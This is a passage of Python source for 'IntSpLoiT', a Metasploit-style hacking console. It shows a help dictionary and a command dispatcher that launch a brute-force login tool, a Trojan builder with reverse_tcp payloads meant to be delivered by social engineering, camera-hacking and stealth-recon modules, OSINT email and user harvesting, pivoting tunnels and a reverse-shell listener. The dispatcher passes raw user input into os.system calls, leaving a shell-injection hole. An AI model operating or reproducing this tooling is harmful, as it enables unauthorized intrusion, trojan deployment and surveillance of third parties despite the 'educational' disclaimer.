            "example": "use exploits/multi/listeners/mini.py",
            "how_to": "1. Type 'show modules' to see all available modules.\n"
                      "2. Use 'use <module_name>' to load it.\n"
                      "3. Then use 'set' commands to configure parameters."
        },
        "show": {
            "description": "Show available modules, commands, tools, or exploits.",
            "usage": "show <type>",
            "example": "show exploits",
            "how_to": "1. Use 'show modules' to list all modules.\n"
                      "2. Use 'show exploits' to see all exploit modules.\n"
                      "3. Use 'show tools' to see auxiliary tools."
        },
        "info": {
            "description": "Get detailed information about the currently selected module.",
            "usage": "info",
            "example": "info",
            "how_to": "1. First, 'use <module>' to select a module.\n"
                      "2. Type 'info' to view description, options, and requirements."
        },
        "run": {
            "description": "Execute the selected module with currently set parameters.",
            "usage": "run",
            "example": "run",
            "how_to": "1. Select a module with 'use'.\n"
                      "2. Configure options with 'set'.\n"
                      "3. Type 'run' to execute it."
        },
        "srun": {
            "description": "Set module parameters and execute immediately.",
            "usage": "srun param1=value1 param2=value2 ...",
            "example": "srun target=192.168.1.100 port=80",
            "how_to": "1. Instead of separate 'set' commands, provide all options in-line.\n"
                      "2. Module runs automatically after setting parameters."
        },
        "jobs": {
            "description": "View and manage active background jobs.",
            "usage": "jobs",
            "example": "jobs",
            "how_to": "1. Shows a list of running jobs with ID and status.\n"
                      "2. Use 'kill <job_id>' to terminate a job."
        },
        "kill": {
            "description": "Terminate a specific background job.",
            "usage": "kill <job_id>",
            "example": "kill 2",
            "how_to": "1. First, view jobs using 'jobs'.\n"
                      "2. Use the job ID to terminate it safely."
        },
        # -------------------- DATABASE COMMANDS --------------------
        "db_connect": {
            "description": "Connect to a database for storing/retrieving scan or module data.",
            "usage": "db_connect <db_name>",
            "example": "db_connect intsp_db",
            "how_to": "1. Ensure the database server is running.\n"
                      "2. Type 'db_connect <db_name>' to connect.\n"
                      "3. Once connected, modules can read/write data."
        },
        "db_list": {
            "description": "List all available databases.",
            "usage": "db_list",
            "example": "db_list",
            "how_to": "Simply type 'db_list' to see all databases on the server."
        },
        "db_disconnect": {
            "description": "Disconnect from the currently connected database.",
            "usage": "db_disconnect",
            "example": "db_disconnect",
            "how_to": "1. Type 'db_disconnect' to safely close the connection."
        },
        "db_nmap": {
            "description": "Perform Nmap scanning with results stored in the database.",
            "usage": "db_nmap <target_network>",
            "example": "db_nmap 192.168.1.0/24",
            "how_to": "1. Connect to the database first with 'db_connect'.\n"
                      "2. Run 'db_nmap <network>' to scan and save results automatically.\n"
                      "3. Use 'db_list' to query scan results."
        },
        "setdb": {
            "description": "Set or change the database connection for modules.",
            "usage": "setdb <db_name>",
            "example": "setdb intsp_db",
            "how_to": "1. Use 'setdb' to switch active database for modules.\n"
                      "2. Modules will read/write from/to the selected database."
        },
        # -------------------- NETWORKING COMMANDS --------------------
        "route": {
            "description": "Add or view routing for specific IPs.",
            "usage": "route add <target_ip> <via_ip> or route show",
            "example": "route add 10.10.10.5 192.168.1.1",
            "how_to": "1. Use 'route show' to see current routing table.\n"
                      "2. Use 'route add <target_ip> <gateway>' to add a route.\n"
                      "3. Routes help in multi-hop connections or pivoting."
        },
        "portfwd": {
            "description": "Set up port forwarding rules.",
            "usage": "portfwd add <lport> <rhost> <rport>",
            "example": "portfwd add 8080 192.168.1.100 80",
            "how_to": "1. 'lport' is the local listening port.\n"
                      "2. 'rhost' is the target host.\n"
                      "3. 'rport' is the port on the remote host to forward to."
        },
        "tunnel": {
            "description": "Configure and manage routing tunnels for multi-hop or pivoting.",
            "usage": "tunnel <command> [options]",
            "example": "tunnel add 192.168.1.0/24 via 10.10.10.5",
            "how_to": "1. Use 'tunnel add' to create a new tunnel.\n"
                      "2. Use 'tunnel show' to display active tunnels.\n"
                      "3. Useful for stealth routing and bypassing network restrictions."
        },
        "connect": {
            "description": "Connect to a specified IP address.",
            "usage": "connect <target_ip> [port]",
            "example": "connect 192.168.1.100 22",
            "how_to": "1. Provide target IP and optionally port.\n"
                      "2. Establishes a session or socket connection."
        },
        # -------------------- AUXILIARY TOOLS --------------------
        "neofetch": {
            "description": "Display detailed system information.",
            "usage": "neofetch",
            "example": "neofetch",
            "how_to": "1. Type 'neofetch' to show OS, kernel, CPU, RAM, and disk info."
        },
        "wifi_scan": {
            "description": "Scan for nearby Wi-Fi networks.",
            "usage": "wifi_scan --interface <interface>",
            "example": "wifi_scan --interface wlan0 --verbose",
            "how_to": "1. Ensure wireless interface is up.\n"
                      "2. Run 'wifi_scan --interface <interface>'\n"
                      "3. Use --verbose for more details like BSSID, signal, encryption."
        },
        "network_scan": {
            "description": "Perform a network scan to discover devices.",
            "usage": "network_scan <target_network> [--ports]",
            "example": "network_scan 192.168.1.0/24 --ports",
            "how_to": "1. Specify the network range in CIDR format.\n"
                      "2. Ping hosts to identify active devices.\n"
                      "3. Optional '--ports' to scan open ports."
        },
        "wardriving": {
            "description": "Map and track Wi-Fi networks using GPS.",
            "usage": "wardriving --interface <iface> --gps",
            "example": "wardriving --interface wlan0 --gps",
            "how_to": "1. Requires GPS coordinates.\n"
                      "2. Run 'wardriving' with wireless interface and GPS option.\n"
                      "3. Collects SSID, BSSID, channel, and GPS location."
        },
        # -------------------- ATTACKING COMMANDS --------------------
        "dragon": {
            "description": "Launch the Dragon brute-force tool.",
            "usage": "dragon <target_ip> -u <username> -p <password_list> [options]",
            "example": "dragon 192.168.1.100 -u admin -p passwords.txt --threads 10",
            "how_to": "1. Provide target IP, username, and password file.\n"
                      "2. Optionally use --threads to speed up attacks.\n"
                      "3. Dragon will attempt login repeatedly until successful or list exhausted."
        },
        "introjan": {
            "description": "Build and deploy advanced Trojan Horses.",
            "usage": "introjan --target <IP> --payload <type> [options]",
            "example": "introjan --target 192.168.1.100 --payload reverse_tcp",
            "how_to": "1. Choose the payload type.\n"
                      "2. Configure target IP and port.\n"
                      "3. Generate executable and deliver via social engineering or other method."
        },
        # -------------------- OSINT COMMANDS --------------------
        "oip": {
            "description": "Search for open ports on a target system.",
            "usage": "oip <target_ip> [--ports]",
            "example": "oip 192.168.1.100 --ports 22,80,443",
            "how_to": "1. Specify the target IP.\n"
                      "2. Optionally specify ports to scan.\n"
                      "3. Results show which ports are open and listening."
        },
        "intcrawler": {
            "description": "Crawl and gather data from websites.",
            "usage": "intcrawler <url> [options]",
            "example": "intcrawler http://example.com --depth 2",
            "how_to": "1. Provide the target URL.\n"
                      "2. Optionally set crawl depth.\n"
                      "3. Tool collects links, forms, and sensitive data."
        },
        "usersearcher": {
            "description": "Search for information about specific users.",
            "usage": "usersearcher <username>",
            "example": "usersearcher john_doe",
            "how_to": "1. Provide the username.\n"
                      "2. Tool searches social media, forums, and public databases."
        },
        "mailsearcher": {
            "description": "Search for email addresses linked to targets.",
            "usage": "mailsearcher <domain>",
            "example": "mailsearcher example.com",
            "how_to": "1. Provide domain name.\n"
                      "2. Tool collects emails from public sources and leaks."
        },
        # -------------------- SPECIALIZED TOOLS --------------------
        "intweb": {
            "description": "Perform web application scanning and analysis.",
            "usage": "intweb <target_url> [options]",
            "example": "intweb http://example.com --scan-all",
            "how_to": "1. Provide target URL.\n"
                      "2. Use options to scan for SQLi, XSS, LFI, RCE.\n"
                      "3. Tool outputs detailed vulnerabilities and affected endpoints."
        },
        "intninja": {
            "description": "Access stealth and ninja operations tools.",
            "usage": "intninja <target_ip>",
            "example": "intninja 10.10.10.10",
            "how_to": "1. Provide target IP.\n"
                      "2. Tools perform reconnaissance stealthily.\n"
                      "3. Data collected is optimized to avoid detection."
        },
        "intmail": {
            "description": "Search for email-related vulnerabilities.",
            "usage": "intmail <email>",
            "example": "intmail john@example.com",
            "how_to": "1. Provide target email.\n"
                      "2. Tool searches for breaches, misconfigurations, and leaks."
        },
        "intcam": {
            "description": "Access or hack camera feeds (authorized or testing environments).",
            "usage": "intcam <target_ip> [options]",
            "example": "intcam 192.168.1.100",
            "how_to": "1. Provide target IP.\n"
                      "2. Tool attempts to access camera streams.\n"
                      "3. Use only in legal or authorized environments."
        },
        # -------------------- PLUGIN HELP --------------------
        "help plugins": {
            "description": "Shows help for dynamically loaded plugins.",
            "usage": "help plugins",
            "example": "help plugins",
            "how_to": "1. Type 'help plugins' to see available plugin commands.\n"
                      "2. Use 'load <plugin>' to load a plugin dynamically.\n"
                      "3. Use 'pl_help' for plugin-specific commands."
        }
    }

    if command is None:
        print("IntSpLoiT Framework Help Menu")
    elif command.lower() == "help":
    	print("IntSpLoiT Framework Help Menu")
    	print("==============================")
    	print("Type 'help <command>' for detailed information on a specific command.\n")
    	print("Available commands:")
    	for cmd in sorted(help_data.keys()):
            print(f"  - {cmd}")
    else:
        cmd = command.lower()
        if cmd in help_data:
            info = help_data[cmd]
            print(f"\nCommand: {cmd}")
            print("-" * (9 + len(cmd)))
            print(f"Description: {info.get('description', 'N/A')}")
            print(f"Usage: {info.get('usage', 'N/A')}")
            print(f"Example: {info.get('example', 'N/A')}")
            if "how_to" in info:
                print(f"How to:\n{info['how_to']}")
        else:
            print(f"[!] No help available for command: {command}")



from prompt_toolkit.completion import FuzzyCompleter, Completer, Completion

class CommandCompleter(Completer):
    def __init__(self, command_dict, history_limit=100):
        self.command_dict = command_dict
        self.history_commands = []
        self.history_limit = history_limit

    def add_to_history(self, command):
        command = command.strip().split()[0]
        if command and command not in self.history_commands:
            self.history_commands.insert(0, command)
            if len(self.history_commands) > self.history_limit:
                self.history_commands.pop()

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor.lower()

        # Önce geçmişten getir
        for cmd in self.history_commands:
            if cmd.startswith(text):
                desc, color = self.command_dict.get(cmd, ("", "\x1b[36m"))
                yield Completion(cmd, start_position=-len(text), display=ANSI(f"{color}{cmd}\x1b[0m"), display_meta=desc)

        # Sonra sabit komutlar
        for cmd, (desc, color) in self.command_dict.items():
            if cmd.startswith(text) and cmd not in self.history_commands:
                yield Completion(cmd, start_position=-len(text), display=ANSI(f"{color}{cmd}\x1b[0m"), display_meta=desc)


import argparse
import requests
import shlex

def imei_check(imei):
    url = f"https://imeicheck.com/imei-check/{imei}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return f"Error: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Error: {str(e)}"

def imei_handler(help_input):
    """
    Uses argparse exactly like the original script.
    Example: "imei 123456789012345"
    """
    try:
        # Convert input string into argv-style list
        args_list = shlex.split(help_input)

        parser = argparse.ArgumentParser(description='IMEI lookup tool')
        parser.add_argument('imei', type=str, help='IMEI number to check')

        # Ignore the first element if it is the command
        if args_list[0].lower() == "imei":
            args_list = args_list[1:]

        args = parser.parse_args(args_list)
        result = imei_check(args.imei)
        print(result)

    except SystemExit:
        # Catch argparse's exit on errors
        print("Error: Missing or invalid parameters. Example: imei 123456789012345")
    except Exception as e:
        print(f"Error: {str(e)}")

# Example framework usage:
# help_input = "imei 123456789012345"
# imei_handler(help_input)

class CommandColorLexer(Lexer):
    def lex_document(self, document):
        def get_line(lineno: int) -> StyleAndTextTuples:
            line = document.lines[lineno]
            words = line.strip().split()
            tokens = []

            for word in words:
                lower = word.lower()

                if lower in ["exploit", "run", "scan", "payload"]:
                    tokens.append(("class:red", word + ' '))
                elif lower in ["use", "set", "show", "options", "back", "info"]:
                    tokens.append(("class:blue", word + ' '))
                elif lower in ["check", "connect", "list"]:
                    tokens.append(("class:green", word + ' '))
                elif lower in ["clear", "exit", "help"]:
                    tokens.append(("class:yellow", word + ' '))
                else:
                    tokens.append(("", word + ' '))

            return tokens

        return get_line

style = PTStyle.from_dict({
    'red': 'bold ansired',
    'blue': 'bold ansiblue',
    'green': 'bold ansigreen',
    'yellow': 'bold ansiyellow',
})

# History objesi prompt_toolkit ile uyumlu şekilde
history = InMemoryHistory()
from prompt_toolkit import prompt
completer = CommandCompleter(commands_with_desc)
fuzzy_completer=FuzzyCompleter(completer)
init(autoreset=True)
get_input()
banner()
manager = plugin_manager.PluginManager()
print("[*] Loading plugins...")
manager.load_plugins()
print(f"[+] {len(manager.plugins)} plugin(s) loaded.")
pro_plugin()
menu_banner()
global help_input
global valid_commands
valid_commands = {
"neofetch", "com-help", "intshark", "oip", "introjan", "intai", "track", "build", "mode-admin", "use", "set", "show", "build", "mode-", "back", "item", "search", "show commands", "int install", "connect", "int", "install", "mode-ninja", "int install mode-ninja", "int install git", "int install aichat", "use", "exploit", "bset", "banner", "py-search", "payload-search", "exp-search", "exploit-search", "jobs", "jobs -k", "dns", "help", "use ", "intcrawler", "searchuser", "mailsearch", "phonesearch", "connectbot", "meterpreter", "shotgun", "imei", "exp-search", "py-search", "run", "show", "whoI", "intattack", "load_plugins", "list_plugins", "run_plugins", "monitor", "add_module", "intattack", "exploiter", "modular","wifi_scan", "network_scan", "wardriving", 'int', 'hydra', 'dragon', "tunnel", "portfwd", "route", "session" #more more more.....
    }
global st
from uuid_manager import *
load_sessions()
create_session("intrpc", "root@int")
print("This is your inactive session. The active session is 0.")
print(" ")
global running_pid
def get_prompt():
    # güvenli şekilde global değişkenlere erişim
    try:
        if 'modules' in globals() and 'modulename' in globals():
            if modules and modulename:
                return get_input(modules=modules, modulename=modulename)
        if 'cdn' in globals() and cdn:
            return get_input(cdn=cdn)
        if 'payloads' in globals() and payloads:
            return get_input(payloads=payloads)
    except Exception:
        pass
    return get_input()
running_pid = None        
from prompt_toolkit import PromptSession
from prompt_toolkit.enums import EditingMode
history_path = os.path.expanduser("~/.intframework_history.txt")
history_fl = FileHistory(history_path)
session = PromptSession(
    history=history_fl,
    lexer=CommandColorLexer(),
    style=style,
    editing_mode=EditingMode.EMACS
)
prompt_str = get_input()
def command_handler(help_input):
    hpparts = help_input.split() if help_input else []
    hpcommand = hpparts[0] if len(hpparts) > 0 else None
    hparguments = hpparts[1:] if len(hpparts) > 1 else None
    if help_input:
    	history.append_string(help_input)
    	readline.add_history(help_input)
    	history_manager.log_command(help_input)
    	completer.add_to_history(help_input)
    if help_input == "":
    	pass   
    if help_input.startswith("help"):
    	m_help = help_input[5:].strip()
    	if m_help:
    		show_help(command=m_help)
    	else:
    		print("""
IntSpLoiT Framework Help Menu
==============================

General Commands  
----------------------  
Command            - Function 
=============================
help               - Show help for commands  
exit               - Exit the console  
banner             - Display or customize the banner tutorial  
credits            - Display credits
clear              - Clear the console screen  
use                - Select a module to use  
show               - Display available commands, tools, or exploits  
info               - Get detailed information about the selected module  
run                - Execute the selected module  
srun               - Set and run a module with specified parameters  
jobs               - View and manage active jobs  
kill               - Terminate a specific job  
db_connect         - Connect to a database  
db_list            - List all available databases  
db_disconnect      - Disconnect from the current database  
db_nmap            - Perform database-integrated Nmap scanning  
set                - Set a specific parameter for a module  
setg               - Set a global parameter for all modules  
setdb              - Set or change the database connection for modules  
route              - Add or view routing for specific IPs  
portfwd            - Set up port forwarding rules  
tunnel             - Configure and manage routing tunnels  
connect            - Connect to a specified IP address  
neofetch           - Display detailed system information  
wifi_scan          - Scan for nearby Wi-Fi networks  
network_scan       - Perform a network scan to discover devices  
wardriving         - Map and track Wi-Fi networks using GPS  
dragon             - Launch the Dragon brute-force tool  
introjan           - Build and deploy advanced Trojan Horses  
oip                - Search open ports on a target system  
intcrawler         - Crawl and gather data from websites  
usersearcher       - Search for information about specific users  
mailsearcher       - Search for email addresses linked to targets  
intweb             - Perform web application scanning and analysis  
intninja           - Access Ninja tools for stealth operations  
intmail            - Search for email-related vulnerabilities  
intcam             - A camera hacking tool for intSpLoiT users  


Module Commands  
----------------  
Command            - Function
=============================
use                - Select a module to use  
show               - Display available commands, tools, or exploits  
info               - Get detailed information about the selected module  
run                - Execute the selected module  
srun               - Set and run a module with specified parameters  

Database Commands  
------------------  
Command            - Function  
==============================
db_connect         - Connect to a database  
db_list            - List all available databases  
db_disconnect      - Disconnect from the current database  
db_nmap            - Perform database-integrated Nmap scanning  
setdb              - Set or change the database connection for modules  

Networking Commands  
--------------------  
Command            - Function  
=============================
route              - Add or view routing for specific IPs  
portfwd            - Set up port forwarding rules  
tunnel             - Configure and manage routing tunnels  
connect            - Connect to a specified IP address  

Auxiliary Commands  
-------------------  
Command            - Function  
=============================
neofetch           - Display detailed system information  
wifi_scan          - Scan for nearby Wi-Fi networks  
network_scan       - Perform a network scan to discover devices  
wardriving         - Map and track Wi-Fi networks using GPS  

Attacking Commands  
-------------------  
Command            - Function  
=============================
dragon             - Launch the Dragon brute-force tool  
introjan           - Build and deploy advanced Trojan Horses  

OSINT Commands  
---------------  
Command            - Function  
============================
oip                - Search open ports on a target system  
intcrawler         - Crawl and gather data from websites  
usersearcher       - Search for information about specific users  
mailsearcher       - Search for email addresses linked to targets  

Specialized Tools  
------------------  
Command            - Function  
===========================
intweb             - Perform web application scanning and analysis  
intninja           - Access Ninja tools for stealth operations  
intmail            - Search for email-related vulnerabilities  
intcam             - A camera hacking tool for intSpLoiT users 

Type 'help <command>' for more information on a specific command.

HELLO, WE ARE THE İNTSPLOİT CYBER TEAM!  
The reason we made this tool is to educate people interested in hacking.  
Any malicious behavior or system infection caused by the user is not our responsibility.  

[intweb] Web scanner for intSpLoiT users  
[intcam] Cam Hack for intSpLoiT users  

We are working...
    		""")
    if help_input == "wifi_scan":
    	scan_wifispy()
    if help_input == "help plugins":
    	print("""
Available commands:

Command       Description
-------       ------------------------------------------
list_plugins  Lists all currently loaded plugins.
load          Loads a plugin or module dynamically.
pl_help       Shows the list of commands and their descriptions provided by plugins.

Type 'help <command>' for more information on a specific command.
    	""")
    if help_input.startswith("meterpreter") and help_input.endswith(""):
    			os.system("python3 intmeterpreter.py start")
    			add_job("meterpreter")
    if help_input.startswith("check"):
    	check_chef = help_input[6:]
    	check_ip(check_chef)
    if help_input.startswith("jobs"):
    	list_jobs()
    	if "-k" in help_input:
    		job_id = help_input[help_input.find("-k "):]
    		kill_job(job_id)
    if help_input.startswith("dns"):
    	if "-f" in help_input:
    		format_chef = help_input[help_input.find("-f "):]
    		main_chef = help_input[help_input.find("DHOST="):]
    		port_chef = help_input[help_input.find(":" or "DPORT="):]
    		domain, port = parse_input(help_input)
    		def tryp(domain):
    		  try:
    		  	socket.inet_aton(domain)
    		  	is_ip = True
    		  except socket.error:
    		  	is_ip = False
    		tryp(domain)
    		
    		if format_chef.lower() == "reverse":
    			if is_ip:
    				reverse_dns_lookup(domain, port)
    			else:
    				print("is not ip")    			
    		if format_chef.lower() == "txt":
    			dns_lookup_txt(domain, port)
    		if format_chef.lower() == "a":
    			dns_lookup_a(domain, port)
    		if format_chef.lower() == "mx":
    			dns_lookup_mx(domain, port)
    		if format_chef.lower() == "ns":
    			dns_lookup_ns(domain, port)
    if help_input.lower().startswith("intninja"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intninja.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intvenom"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intvenom.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intweb"):
    	hel = help_input[7:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intweb "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intcam"):
    	hel = help_input[7]
    	s = os.getcwd()
    	os.system("$INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intcam.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("oip"):
    	hel = help_input[4:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 oip "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intmail"):
    	hel = help_input[8:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("cd modules")
    	os.system("python3 modules/intmail.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("imei"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[5:]
    		imei_handler(help_input)
    	else:
    		pass	
    if help_input.startswith("usersearcher"):
    	hel = help_input[help_input.find("usersearcher"):]
    	usersearch_handler(help_input)
    if help_input.startswith("shotgun"):
    	hel = help_input[help_input.find("shotgun "):]
    	shotgun_handler(help_input)
    if help_input.startswith("intcrawler"):
    	hel = help_input[help_input.find("intcrawler "):]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intcrawler.py {hel}" if hel else "python3 intcrawler.py.")
    	os.system(f"cd {s}")
    	
    elif help_input.lower().startswith("back"):
    	get_input()
    elif help_input.lower().startswith("info" or "get-help"):
    	global info_get
    	if help_input.lower().startswith("info"):
    		info_get = help_input[5:]
    	if help_input.lower().startswith("get-help"):
    		info_get = help_input[9:]
    	else:
    		print("invalid argument detected")
    	if info_get.lower() == "dns":
    		print("""
            usage:
        
            Commands           Function
            ==========         ========              
            DHOST=             İP OR HOST
            -f (Format)   >>    formatting dns example modules: txt, mx, ns, a
            DPORT
        
            example:
                dns DHOST=127.0.0.1:90 -f txt
                dns DHOST=127.0.0.1 DPORT=90 -f mx
                """)
    		if info_get.lower() == "connect":
    			print("""
    			usage: connect CHOST=(HOST) CPORT=(PORT)
    			CHOST:
    				your target host or your want to connect host
    			CPORT:
    				your tadget port or your want to connect port
    			Commands       Function
    		   ==========     =========
    		   CHOST               connecting target host
    		   CPORT               connecting target port
    			""")
    		if info_get.lower() == "introjan":
    			print("""
İNTROJAN COMMANDS
=====================
    |Command|           |Function|
    ------------------            ----------------
	 -ip or -ipv4           -İp adress of the target
	 -k   					   -connect a cable
	 -r or --remote      -remote to lxde or cmd
	 -d or --dir			 -directory show on computer
	 -g   {video url}     -open video url on computer	
	 -p    				  	-port
	 -s or --send-message  -send ip or cable to computer
    			""")
    		if info_get.lower() == "oip":
    			print("""
    			
    			""")
    		if info_get.lower() == "vp":
    			print("""
    			Commands      Function
    		   ===========  =========
    		     -a --add           adding and installing vp
    		     -b --build		building vp
    		     
    		     example:
    		     	vp -a or vp --add
    		     	vp -b or vp --build    		     	
    			""")
    		if info_get.lower() == "use":
    			print("""
    			Commands    Function
    		   ==========  =========
    intframework::modules        using intmodules
    		    exploit            using exploits
    		    payloads       using payloads
    		    auxiliary        using auxiliary modules
    		    shodan          using shodan
    		    osint              using osint
    		    attack            intikam21 attack modules
    		    drones           using intdrones
    		    scanners       using scanner
    		    
    		    example:
    		    	use intframework::modules::AUTO:ctf.py or use intframework/modules/AUTO/ctf.py
    		    
    		    we are developed this framework this framework uses :: and / 
    		    	
    			""")
    elif help_input.startswith("connect"):
    	ip_chef = help_input[help_input.lower().find("CHOSTS=" or "CHOST= "):]
    	port_chef = help_input[help_input.lower().find("CPORT=" or "CPORTS=")]
    	if ip_chef:
    		listen(ip_chef)
    	if ip_chef and port_chef:
    		listen_p(ip_chef, port_chef)
    else:
    	try:
    		pass
    	except:
    		pass
    if help_input.startswith("searchuser"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("searchuser "):]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 searchuser.py "+hel if hel else "python3 searchuser.py")
    		os.system(f"cd {s}")
    	else:
    		os.system(help_input)
    if help_input.startswith("intserver"):
    	if "--autoupdate" in help_input:
    		os.system("python3 update.py")
    	if "shot" in help_input:
    		os.system(f"python3 shotgun.py LHOSTS={LHOSTS if LHOSTS else None} LPORTS={LPORTS if LPORTS else None} bytes=200000")
    elif help_input == "banner":
    	banner()
    	menu_banner()
    if help_input.startswith("add_module"):
    	mdd = help_input[11:]
    	try:
    		os.system(f"mv {mdd} usr/opt/intframework/modules/")
    	except:
    		try:
    			os.system(f"mv {mdd} $INTFRAMEWORK_PATH")
    		except:
    			print("please export INTFRAMEWORK_PATH.")    
    if help_input.startswith("wardriving"):
    	setdbs = help_input[11:]
    	if setdbs == "start":
    		set_wlan = help_input[17:]
    		scan5115(set_wlan)
    	if setdbs == "end" or "exit" or "break" or "stop":
    		pass
    else:
    	pass
    if help_input.startswith("db_nmap"):
        # Nmap komutunu çalıştır
        nmap_scanner = NmapScanner()
        if help_input == "db_nmap -l":
                # Veritabanındaki sonuçları listele
            print("Listing scan results:")
            nmap_scanner.db.list_scan_results()

        elif help_input == "db_nmap close":
                # Veritabanı bağlantısını kapat
            print("Closing database...")
            nmap_scanner.db.close()
            os.remove(nmap_scanner.db.db_name)  # Veritabanı dosyasını sil
            print("Database file deleted.")

        else:
        	nmap_command = help_input.replace("db_nmap", "nmap")
        	nmap_scanner.run_command(nmap_command)
    if help_input == "db_connect":
    	st = "started"
    if help_input == "db_list":
    	db_list()
    if help_input  == "db_disconnect":
    	db_disconnect()
    if help_input == "load":         
        parser = argparse.ArgumentParser()
        parser.add_argument("name", nargs="?")
        parser.add_argument("-i", dest="path", nargs="?")
        args = parser.parse_args(hparguments)
        name = args.name
        path = args.path
        if path:
        	print(manager.load_plugin_module(name, path=path))
        else:
        	print(manager.load_command(name))
        	pass

    else:
    	pass
    if help_input.startswith("session"):
    	handle_sessions(help_input, sm)
    if help_input == "exploiter":
    	print("new exploiter session created")
    	os.system("python3 exploiter.py")
    if help_input == "modular":
    	os.system("python3 modular.py")
    if help_input == "list_plugins":
    	manager.list_plugins()
    else:
    	pass
    if help_input == "neofetch":
    	os.system("python3 neofetch.py")
    	add_job("neofetch")
    else:
    	pass
    if help_input == "intattack":
    	os.system("python3 intattack.py")
    try:
        if help_input.startswith("network_scan"):
        	import network_scan
        	from network_scan import scan_network
        	scan_network()
    except Exception as e:
    	print(f"Error executing {help_input}: {e}")
    	
    if help_input.startswith("use "):
        use_module(help_input)
    if help_input.startswith("run") and "<" in help_input and ">" in help_input:
        start_index = help_input.find('<') + 1
        end_index = help_input.find('>')
        extracted_text = help_input[start_index:end_index]
        try:
        	run_module(skar3792=extracted_text)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] User interrupted input (Ctrl+C){Style.RESET_ALL}")
            pass
    if help_input == "run":
        run_module()
    if help_input == "show options":
    	config_manager.show_options()
    if help_input == "osint":
    	print("https://osintframework.com/")
    if help_input.startswith("set"):
        # "set " kısmından sonrasını al (4. indexten itibaren)
        command_parts = help_input[4:].split(" ", 1)  # Burada bir boşlukla ayırıyoruz
        
        if len(command_parts) == 2:
            variable, value = command_parts
            config_manager.set_option(variable, value)  # set fonksiyonunu çağır
        else:
            print("[-] Invalid input. Please provide both variable and value.")
    if help_input.startswith("setg"):
        # "set " kısmından sonrasını al (4. indexten itibaren)
        command_parts = help_input[5:].split(" ", 1)  # Burada bir boşlukla ayırıyoruz
        
        if len(command_parts) == 2:
            variable, value = command_parts
            setg(variable, value)  # set fonksiyonunu çağır
        else:
            print("[-] Invalid input. Please provide both variable and value.")
    if help_input.startswith("setdb"):
    	command_parts = help_input[6:].split(" ", 1)
    	if len(command_parts) == 2:
    		variable, value = command_parts
    		setdb(variable, value)
    	else:
    		print("[-] Invalid input. Please provide both variable and value.")
    if help_input.startswith("search"):
        parts = help_input.split(" ", 1)  # Sadece 1 kez böl, komut ve query ayrılır
        if len(parts) == 2 and parts[1].strip():
            search(help_input)  # Burada komple komutu gönderiyoruz, çünkü lib.search zaten parçalayacak
        else:
            print(f"[{Fore.BLUE}inttable{Fore.RESET}] Syntax Error: Usage: search <query> [filters]")
    if help_input == "whoami":
    	username = getpass.getuser()
    	# Sistemin platform bilgisini alma
    	platform_info = platform.system()
    	print(Fore.GREEN + username)
    help = {"com-help" or "Com-help" or "Com-Help" or "com-HELP" or "COM-help" or "COM-HELP"}
    if help_input.startswith("route"):
    	routeip = help_input[6:]
    	if routeip:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/route.py {routeip}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/route.py")
    if help_input.startswith("portfwd"):
    	portforwd = help_input[8:]
    	if portforwd:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/portfwd.py {portforwd}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/portfwd.py")
    if help_input.startswith("tunnel"):
    	tunnels = help_input[8:]
    	if tunnels:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/tunnel.py {tunnels}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/tunnel.py")
    if help_input.startswith("dragon"):
    	dragonn = help_input[8:]
    	if dragonn:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/dragon {dragonn}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/dragon")
    if help_input.startswith("listen"):
    	lport = help_input[7:] if help_input[7:] else None
    	if lport is None:
    		print("Listening 5000...")
    		os.system("python3 $INTFRAMEWORK_PATH/modules/exploits/multi/handler.py -lh 0.0.0.0 -lp 5000")
    	else:
    		print(f"Listening {lport}...")
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/exploits/multi/handler.py -lh 0.0.0.0 -lp {lport}")
    if help_input.startswith("dump"):
    	dumper = help_input[5:]
    	if dumper:
    		os.system(f"python3 {intframework_path}/commands/dump.py {dumper}")
    	else:
    		os.system(f"python3 {intframework_path}/commands/dump.py -h")
    if hpcommand is None:
        pass

    if hpcommand == "pl_help":
        print(manager.get_plugin_help())
        pass

    if hpcommand in manager.get_commands():
        result = manager.run_command(hpcommand, hparguments)
        print(result)
        pass
        
    if help_input.startswith("webgui"):
    	action = help_input[7:]
    	if action == "install":
    		os.system("""
cd ..
git clone -b webgui https://github.com/intSpLoiT/intframework.git intframeworkweb
cd intframeworkweb
echo "export intweb=$(pwd)" >> ~/.bashrc
pip3 install -r requirements.txt
cd ..
cd $INTFRAMEWORK_PATH
    		""")
    	if action == "start":
